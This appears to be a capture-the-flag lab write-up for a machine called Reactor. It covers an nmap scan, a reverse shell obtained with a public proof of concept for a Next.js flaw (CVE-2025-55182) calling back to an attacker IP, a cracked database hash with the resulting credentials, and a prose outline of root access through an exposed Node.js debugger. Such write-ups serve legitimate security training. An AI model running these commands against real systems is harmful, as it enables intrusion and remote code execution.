### 1. Overview
This machine involved exploiting a vulnerable Next.js application (CVE-2025-55182) to gain an initial reverse shell. After accessing the system, an exposed database file provided a password hash that was cracked to achieve SSH access as a standard user. Privilege escalation was accomplished by discovering a local Node.js debugger service, port-forwarding it, and leveraging the WebSocket interface to evaluate JavaScript and execute system commands as root.
### 2. Recon
Starting off this machine, I ran the standard Nmap service and port scan:
```
╰─❯ nmap -sCV 10.129.1.77 -oN reactor.nmap
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
```

This scan found 2 ports:
- **22 SSH**
- **3000 HTTP**

Going to the website hosted on port `3000`, I was greeted with a ReactorWatch monitoring page. Using the firefox plugin `wappalyzer`. I found that the site was using Next.js version 15.0.3 and React.

This combo is vulnerable to the React2shell vulnerability.
### 3. Foothold
Using the following github poc, I managed to get a revshell on the target. 
`https://github.com/Chocapikk/CVE-2025-55182`:
```
╰─❯ python3 exploit.py -u http://10.129.1.193:3000 -r -l 10.10.14.81 -p 4444 -P nc-mkfifo
[*] Starting reverse shell listener on 10.10.14.81:4444
[*] Sending reverse shell payload...
Waiting for connection...
Reverse shell connection established from 10.129.1.193:60390!
sh: 0: can't access tty; job control turned off
$
```

Reading the `reactor.db` database file gave me the password hash for the user `engineer`:
```
$ cat reactor.db
...[SNIP]...
engineer39d97110eafe2a9a68639812cd271e8e...[SNIP]...
```

After cracking the hash using hashcat, I was able to sign in to ssh with the following credentials:
`engineer:reactor1`

### 5. Conclusion
Initial access was gained by identifying a vulnerable Next.js and React stack on port 3000 and utilizing a public React2shell exploit (CVE-2025-55182) to obtain a reverse shell. Reading the `reactor.db` file yielded a password hash, which was subsequently cracked to provide SSH access for the `engineer` user.

Further enumeration revealed a locally bound Node.js debugger running on port 9229. After forwarding this port via SSH, a WebSocket connection was established using `wscat`. By interacting with the debugger's runtime evaluation capabilities, it was possible to invoke `child_process.exec` through `process.mainModule.require`, successfully bypassing restrictions and leading directly to a root reverse shell.
